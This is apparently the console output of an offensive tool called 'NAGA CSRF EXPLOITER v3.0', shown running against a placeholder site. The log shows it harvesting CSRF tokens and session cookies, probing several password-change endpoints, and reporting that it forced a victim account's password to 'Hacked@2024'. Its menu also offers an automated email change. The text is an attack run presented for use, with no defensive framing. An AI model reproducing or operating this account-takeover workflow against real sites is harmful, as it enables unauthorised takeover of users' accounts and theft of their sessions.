╔═══════════════════════════════════════════════════════════════════════════╗
║                    🐉 NAGA CSRF EXPLOITER v3.0 🐉                          ║
║                    FULL AUTO - Endpoint & Parameter Hunter                 ║
║                    Auto Detect → Auto Test → Auto Exploit                 ║
╚═══════════════════════════════════════════════════════════════════════════╝

[*] python3 scan.py https://target.com


[*] Target: https://target.com

[>] Fetching target page...
[✓] Page loaded (Status: 200)

[1] Extracting Tokens...
[+] Found 2 tokens:
    - Meta: csrf-token: 7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p
    - Cookie: XSRF-TOKEN: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

[2] Extracting Session Cookies...
[+] Found 1 session cookies:
    - session: abc123def456ghi789jkl...

============================================================
💀 CSRF EXPLOITATION MENU (AUTO MODE)
============================================================

    1. Change Password (AUTO - Scan & Exploit)
    2. Change Email (AUTO - Scan & Exploit)
    3. Change Password with Known Current Password
    4. Skip

[?] Pilih (1-4): 1

[?] New password: Hacked@2024

[*] Starting auto-exploit for password change...

[>] Scanning for password change endpoints...
    [200] /user/password (csrf: _token)
    [200] /profile/password (csrf: csrf_token)
    [302] /settings/password (csrf: csrfmiddlewaretoken)
    [200] /api/change-password (csrf: X-CSRF-TOKEN)

[>] Trying to exploit found endpoints...

  [Testing] /user/password
  Failed (Status: 400)

  [Testing] /profile/password
  Failed (Status: 400)

  [Testing] /settings/password
  Failed (Status: 400)

  [Testing] /api/change-password

✅ SUCCESS! Password changed at /api/change-password
   Status: 200
   Used data: {'X-CSRF-TOKEN': 'token', 'password': 'Hacked@2024', 'confirm': 'Hacked@2024'}

🎉 PASSWORD CHANGE SUCCESSFUL!
⚠️  New password: Hacked@2024

[✓] Scan completed!
